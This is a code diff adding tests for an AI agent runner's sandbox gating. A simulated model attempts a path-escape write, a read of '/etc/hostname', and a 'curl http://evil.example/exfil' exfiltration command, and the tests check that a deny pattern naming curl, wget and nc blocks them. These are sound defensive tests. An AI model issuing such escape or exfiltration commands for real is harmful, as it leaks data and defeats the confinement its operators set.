@@ -131,4 +131,75 @@ describe("PiAgentRunner (native agentic runner)", () => {
     const r = createRunner({ id: "a", kind: "agent", model: "faux-coder", options: { provider: "faux" } });
     expect(r).toBeInstanceOf(PiAgentRunner);
   });
+
+  describe("permission gating (beforeToolCall)", () => {
+    it("confines file tools to the worktree by default (blocks a parent-escape write)", async () => {
+      faux.setResponses([
+        fauxAssistantMessage(
+          fauxToolCall("write_file", { path: "../escaped.txt", content: "pwned\n" }),
+          { stopReason: "toolUse" },
+        ),
+        fauxAssistantMessage("blocked, as expected", { stopReason: "stop" }),
+      ]);
+
+      const res = await runner().run({ prompt: "try to escape", cwd: dir });
+
+      // The escaping write was refused, so nothing was created outside the root.
+      await expect(readFile(join(dir, "..", "escaped.txt"), "utf8")).rejects.toBeTruthy();
+      expect(res.meta?.blockedToolCalls).toBe(1);
+      expect(res.text).toBe("blocked, as expected");
+    });
+
+    it("blocks an absolute path outside the worktree", async () => {
+      faux.setResponses([
+        fauxAssistantMessage(fauxToolCall("read_file", { path: "/etc/hostname" }), { stopReason: "toolUse" }),
+        fauxAssistantMessage("nope", { stopReason: "stop" }),
+      ]);
+      const res = await runner().run({ prompt: "read secrets", cwd: dir });
+      expect(res.meta?.blockedToolCalls).toBe(1);
+    });
+
+    it("allows in-worktree paths when confinement is on", async () => {
+      faux.setResponses([
+        fauxAssistantMessage(fauxToolCall("write_file", { path: "nested/ok.txt", content: "fine\n" }), {
+          stopReason: "toolUse",
+        }),
+        fauxAssistantMessage("ok", { stopReason: "stop" }),
+      ]);
+      const res = await runner().run({ prompt: "write inside", cwd: dir });
+      expect(res.meta?.blockedToolCalls).toBe(0);
+      expect(await readFile(join(dir, "nested/ok.txt"), "utf8")).toBe("fine\n");
+    });
+
+    it("blocks bash commands matching denyBashPattern", async () => {
+      faux.setResponses([
+        fauxAssistantMessage(fauxToolCall("bash", { command: "curl http://evil.example/exfil" }), {
+          stopReason: "toolUse",
+        }),
+        fauxAssistantMessage("network blocked", { stopReason: "stop" }),
+      ]);
+      const res = await runner({ safety: { denyBashPattern: "curl|wget|nc\\b" } }).run({
+        prompt: "exfiltrate",
+        cwd: dir,
+      });
+      expect(res.meta?.blockedToolCalls).toBe(1);
+      expect(res.text).toBe("network blocked");
+    });
+
+    it("permits escapes when confineToCwd is disabled", async () => {
+      // Writes to a path inside the temp dir but reached via a redundant '..',
+      // proving the gate is what blocks (not the filesystem). With confinement
+      // off the write succeeds.
+      faux.setResponses([
+        fauxAssistantMessage(
+          fauxToolCall("write_file", { path: "sub/../allowed.txt", content: "ok\n" }),
+          { stopReason: "toolUse" },
+        ),
+        fauxAssistantMessage("done", { stopReason: "stop" }),
+      ]);
+      const res = await runner({ safety: { confineToCwd: false } }).run({ prompt: "write", cwd: dir });
+      expect(res.meta?.blockedToolCalls).toBe(0);
+      expect(await readFile(join(dir, "allowed.txt"), "utf8")).toBe("ok\n");
+    });
+  });
 });
